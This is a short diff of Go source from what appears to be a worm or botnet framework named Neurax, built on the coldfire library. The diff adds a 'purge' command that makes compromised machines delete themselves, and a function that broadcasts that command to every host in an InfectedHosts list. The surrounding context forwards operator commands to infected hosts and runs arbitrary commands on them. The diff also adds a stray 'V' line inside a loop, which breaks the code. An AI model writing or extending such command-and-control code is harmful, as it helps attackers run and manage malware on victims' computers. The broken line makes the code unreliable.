@@ -225,6 +225,7 @@ func handle_command(cmd string) {
 			for _, host := range InfectedHosts {
 				err := DataSender(host, NeuraxConfig.comm_port, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
+				V
 			}
 		}
 		if strings.Contains(preamble, "r") {
@@ -232,6 +233,10 @@ func handle_command(cmd string) {
 			os.Exit(0)
 		}
 	} else {
+		if cmd == "purge" {
+			coldfire.Remove()
+			os.Exit(0)
+		}
 		coldfire.CmdOut(cmd)
 	}
 
@@ -336,4 +341,16 @@ func NeuraxDisks() error {
 		}
 	}
 	return nil
+}
+
+func NeuraxPurge() {
+	DataSender := coldfire.SendDataUDP
+	if NeuraxConfig.comm_proto == "tcp" {
+		DataSender = coldfire.SendDataTCP
+	}
+	for _, host := range InfectedHosts {
+		err := DataSender(host, NeuraxConfig.comm_port, "purge")
+		ReportError(err)
+	}
+	handle_command("purge")
 }
